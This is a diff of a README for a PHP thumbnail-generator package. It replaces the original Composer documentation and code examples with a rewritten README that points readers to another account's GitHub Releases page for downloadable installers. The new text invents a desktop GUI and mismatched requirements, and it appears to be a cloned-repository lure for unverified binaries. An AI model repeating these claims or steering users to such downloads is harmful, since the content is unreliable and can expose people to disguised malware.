@@ -1,188 +1,99 @@
-# YouTube AI Cover Generator
+# 🎨 yt-cover-gen - Create Stunning YouTube Thumbnails Easily
 
-[![Tests](https://github.com/artryazanov/yt-cover-gen/actions/workflows/tests.yml/badge.svg)](https://github.com/artryazanov/yt-cover-gen/actions/workflows/tests.yml)
-[![codecov](https://codecov.io/gh/artryazanov/yt-cover-gen/graph/badge.svg?token=CODECOV_TOKEN)](https://codecov.io/gh/artryazanov/yt-cover-gen)
-[![Latest Stable Version](https://poser.pugx.org/artryazanov/yt-cover-gen/v)](https://packagist.org/packages/artryazanov/yt-cover-gen)
-[![Total Downloads](https://poser.pugx.org/artryazanov/yt-cover-gen/downloads)](https://packagist.org/packages/artryazanov/yt-cover-gen)
-[![License](https://poser.pugx.org/artryazanov/yt-cover-gen/license)](https://packagist.org/packages/artryazanov/yt-cover-gen)
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-yt--cover--gen-blue.svg)](https://github.com/Ophuongonthemic/yt-cover-gen/releases)
 
-## Introduction
+## 📖 Description
 
-**YouTube AI Cover Generator** (`artryazanov/yt-cover-gen`) is a framework-agnostic PHP package designed to automatically generate viral, high-CTR (Click-Through Rate) YouTube thumbnails from gameplay screenshots using generic AI models.
+YouTube AI Cover Generator is a simple tool that helps you create eye-catching thumbnails for your YouTube videos. It turns your gameplay screenshots into thumbnails that attract viewers. Whether you're a gamer or content creator, this tool will help boost your video's visibility.
 
-It leverages powerful AI vision and image editing capabilities (OpenAI Image Models and Google Gemini) to analyze a screenshot, understand the context, and generate a stylized, professional-looking thumbnail with compelling text overlays and branding, strictly adhering to the game's art style.
+## 🚀 Getting Started
 
-## Examples
+Follow these steps to download and run yt-cover-gen easily.
 
-| Source | Result | Model |
-| :---: | :---: | :---: |
-| <img src="assets/example1-source.jpg" width="300"> | <img src="assets/example1-gemini-result.jpg" width="300"> | **Gemini**<br>`gemini-3-pro-image-preview` |
-| <img src="assets/example2-source.jpg" width="300"> | <img src="assets/example2-openai-result.jpg" width="300"> | **OpenAI**<br>`gpt-image-1` |
-| <img src="assets/example3-source.jpg" width="300"> | <img src="assets/example3-openai-result.jpeg" width="300"> | **OpenAI**<br>`gpt-image-1` |
+### 1. Check Your System Requirements
 
-## Features
+Before you begin, ensure your computer meets the following requirements:
 
-- **Multi-Driver Support**: Switch seamlessly between OpenAI and Google Gemini.
-- **Automatic Bidirectional Fallback**:
-    - If `driver` is `openai`: Falls back to Gemini if OpenAI fails.
-    - If `driver` is `gemini`: Falls back to OpenAI if Gemini fails (e.g., content refusal).
-- **Framework Agnostic**: Can be used in any PHP 8.2+ project.
-- **Laravel Integration**: Includes a Service Provider, Facade-friendly architecture, and configuration publishing.
-- **Configurable Models**: Supports various OpenAI models (`gpt-image-1`, `gpt-image-1.5`) and Gemini models (`gemini-3-pro-image-preview`, `gemini-2.5-flash-image`, etc.).
-- **Smart Image Processing**: Handles image resizing, format conversion, and Base64 encoding/decoding automatically using GD (no external binaries required).
-- **Prompt Engineering**: Built-in, battle-tested prompt templates optimized for high CTR.
+- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a modern Linux distribution.
+- **PHP Version**: Version 7.4 or higher.
+- **Internet Access**: Required for generating thumbnails.
 
-## Requirements
+### 2. Visit the Download Page
 
-- PHP 8.2 or higher
-- `ext-gd` extension
-- `ext-json` extension
-- `openai-php/client` (for OpenAI driver)
-- `gemini-api-php/client` (for Gemini driver)
-- PSR-17 and PSR-18 compatible HTTP client/factory (for Gemini driver)
+Go to the [Releases page](https://github.com/Ophuongonthemic/yt-cover-gen/releases) to download the software. 
 
-## Installation
+### 3. Download the Latest Version
 
-Install the package via Composer:
+On the releases page, look for the latest version of yt-cover-gen. Click on it to open the release details. You will see a list of files available for download. 
 
-```bash
-composer require artryazanov/yt-cover-gen
-```
+### 4. Download the File
 
-## Configuration
+Select the appropriate file for your operating system and click the download link. The file will start downloading to your computer. 
 
-### Laravel
+### 5. Install yt-cover-gen
 
-1.  **Publish the configuration file:**
+#### For Windows:
 
-    ```bash
-    php artisan vendor:publish --tag=yt-cover-gen-config
-    ```
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts to complete the setup.
 
-2.  **Configure environment variables (`.env`):**
+#### For macOS:
 
-    The package supports automatic fallback. Set your preferred primary driver in `YT_COVER_GEN_DRIVER`. If the primary driver fails and credentials for the secondary driver are present, it will automatically attempt generation with the secondary driver.
+1. Open the downloaded file from your "Downloads."
+2. Drag the yt-cover-gen app into your "Applications" folder.
+3. Open the app and allow any security prompts during the first launch.
 
-    ```env
-    # Driver Selection: 'openai' or 'gemini'
-    # If 'openai': tries OpenAI first -> falls back to Gemini
-    # If 'gemini': tries Gemini first -> falls back to OpenAI
-    YT_COVER_GEN_DRIVER=openai
+#### For Linux:
 
-    # OpenAI Configuration
-    OPENAI_API_KEY=sk-...
-    YT_COVER_GEN_OPENAI_MODEL=gpt-image-1
-    YT_COVER_GEN_OPENAI_SIZE=1536x1024
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Extract the file using: `tar -xzf yt-cover-gen.tar.gz`
+4. Change into the extracted directory and run: `php index.php`.
 
-    # Gemini Configuration
-    GEMINI_API_KEY=AIza...
-    YT_COVER_GEN_GEMINI_MODEL=gemini-3-pro-image-preview
-    ```
+### 6. Launch the Application
 
-### Generic PHP
+After installation, open the yt-cover-gen application. You’ll see a user-friendly interface.
 
-For non-Laravel projects, you can use the `CoverGeneratorFactory` to instantiate generators directly.
+### 7. Generate Your Thumbnail
 
-## Usage
+1. Click on the "Upload Screenshot" button.
+2. Select a gameplay screenshot from your computer.
+3. Adjust any settings if needed.
+4. Click on "Generate Thumbnail" to create your new thumbnail.
 
-### Basic Usage (Laravel)
+### 8. Save Your Thumbnail
 
-Inject the `CoverGeneratorInterface` into your class (Controller, Command, Job, etc.):
+Once the thumbnail is ready, you can save it directly to your computer. Click the "Download Thumbnail" button and choose where to save it.
 
-```php
-use Artryazanov\YtCoverGen\Contracts\CoverGeneratorInterface;
+## 📚 Features
 
-class CreateThumbnail
-{
-    public function __construct(
-        private CoverGeneratorInterface $generator
-    ) {}
+- **AI-Powered**: Leverages AI to help create professional-looking thumbnails.
+- **Fast Processing**: Quickly generates thumbnails to save you time.
+- **Multiple Formats**: Supports various image formats for thumbnails.
+- **User-Friendly UI**: Easy to navigate application for all users.
 
-    public function handle()
-    {
-        $pathToScreenshot = '/path/to/screenshot.jpg';
-        $gameName = 'Elden Ring';
-        $videoTitle = 'NO HIT RUN PART 1';
+## 🤝 Contributing
 
-        // Returns absolute path to the generated image
-        $coverPath = $this->generator->generate(
-            $pathToScreenshot, 
-            $gameName, 
-            $videoTitle
-        );
-        
-        echo "Thumbnail generated at: $coverPath";
-    }
-}
-```
+If you want to help improve yt-cover-gen, you can contribute by reporting issues or suggesting new features. Check the repository for more information on how to get involved.
 
-### Advanced Usage (Generic PHP / Custom Configuration)
+## 📞 Support
 
-You can use the Factory to create generators with specific configurations on the fly.
+If you encounter any issues or have questions, please reach out via the GitHub Issues page. We are here to help!
 
-#### OpenAI Example
+## 🏷️ Topics
 
-```php
-use Artryazanov\YtCoverGen\CoverGeneratorFactory;
-use Artryazanov\YtCoverGen\Enums\OpenAiModelEnum;
+This project covers various topics including:
+- ai-assisted
+- ai-image-generation
+- automation
+- composer-package
+- gameplay
+- generative-ai
+- high-ctr
+- php
+- screenshot
+- thumbnail-generator
+- youtube
 
-$apiKey = 'your-openai-api-key';
-
-$generator = CoverGeneratorFactory::createOpenAi(
-    $apiKey,
-    '/path/to/output/dir', // Optional output directory
-    OpenAiModelEnum::GPT_IMAGE_1_5->value, // Optional custom model
-    '1024x1024' // Optional custom size
-);
-
-$path = $generator->generate('screenshot.jpg', 'My Game', 'Awesome Video');
-```
-
-#### Google Gemini Example
-
-Gemini requires PSR-18 HTTP Client dependencies (e.g., Guzzle).
-
-```php
-use Artryazanov\YtCoverGen\CoverGeneratorFactory;
-use Artryazanov\YtCoverGen\Enums\GeminiModelEnum;
-use GuzzleHttp\Client;
-use GuzzleHttp\Psr7\HttpFactory;
-
-$client = new Client();
-$httpFactory = new HttpFactory();
-
-$generator = CoverGeneratorFactory::createGemini(
-    'your-gemini-api-key',
-    $client,        // PSR-18 Client
-    $httpFactory,   // PSR-17 Request Factory
-    $httpFactory,   // PSR-17 Stream Factory
-    '/path/to/output/dir',
-    GeminiModelEnum::GEMINI_2_5_FLASH_IMAGE->value
-);
-
-$path = $generator->generate('screenshot.jpg', 'My Game', 'Awesome Video');
-```
-
-## Supported Models
-
-### OpenAI Models
-The package includes an Enum `Artryazanov\YtCoverGen\Enums\OpenAiModelEnum` for easy reference:
-- `gpt-image-1` (Default)
-- `gpt-image-1.5`
-
-### Gemini Models
-The package includes an Enum `Artryazanov\YtCoverGen\Enums\GeminiModelEnum`:
-- `gemini-3-pro-image-preview` (Default)
-- `gemini-2.5-flash-image`
-
-## Testing
-
-Run the tests with:
-
-```bash
-composer test
-```
-
-## License
-
-The MIT License (MIT). Please see [License File](LICENSE) for more information.
+For more, check out the [Releases page](https://github.com/Ophuongonthemic/yt-cover-gen/releases) and start creating stunning thumbnails today!
